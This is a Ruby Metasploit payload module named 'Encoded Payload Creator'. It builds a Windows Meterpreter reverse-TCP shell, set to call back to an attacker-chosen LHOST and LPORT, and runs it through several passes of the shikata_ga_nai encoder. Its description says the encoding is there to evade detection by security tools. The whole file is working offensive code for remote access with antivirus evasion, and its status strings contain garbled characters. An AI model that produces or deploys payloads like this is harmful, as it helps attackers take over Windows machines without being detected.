##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Payload
    include Msf::Payload::Single
  
    def initialize(info = {})
      super(merge_info(info,
        'Name'        => 'Encoded Payload Creator',
        'Description' => %q{
          Builds a custom reverse shell payload and applies encoding 
          to evade detection by security tools.
        },
        'Author'      => ['Joshua Santiago'],
        'License'     => MSF_LICENSE,
        'Platform'    => 'win',
        'Arch'        => ARCH_X86,
        'Handler'     => Msf::Handler::ReverseTcp,
        'Session'     => Msf::Sessions::Meterpreter_x86_Win,
        'PayloadType' => 'windows'
      ))
  
      register_options([
        OptString.new('LHOST', [true, 'Local IP for callback']),
        OptInt.new('LPORT', [true, 'Local port for callback', 4444]),
        OptString.new('ENCODER', [true, 'Encoder module to use', 'x86/shikata_ga_nai']),
        OptInt.new('ITERATIONS', [true, 'Number of encoding passes', 3])
      ])
    end
  
    def generate
      build_encoded_payload
    end
  
    def build_encoded_payload
      lhost   = datastore['LHOST']
      lport   = datastore['LPORT']
      encoder = datastore['ENCODER']
      rounds  = datastore['ITERATIONS']
      base_payload = 'windows/meterpreter/reverse_tcp'
  
      print_status("ðŸ”§ Creating raw payload using: #{base_payload}")
  
      # Create base payload
      payload = framework.payloads.create(base_payload)
      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport
  
      raw_payload = payload.generate_simple(
        'Format'    => 'raw',
        'OptionStr' => "LHOST=#{lhost} LPORT=#{lport}"
      )
  
      # Apply encoder
      encoder_module = framework.encoders.create(encoder)
      unless encoder_module
        print_error("ðŸš« Encoder '#{encoder}' not found.")
        return nil
      end
  
      encoder_module.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })
  
      encoded = raw_payload
      rounds.times do |i|
        encoded = encoder_module.encode(encoded, nil, nil, platform)
      end
  
      short_hex = encoded.unpack('H*').first[0..50].scan(/../).map { |b| "\\x#{b}" }.join
      print_good("âœ… Encoded payload generated: #{short_hex}...")
  
      encoded
    end
  end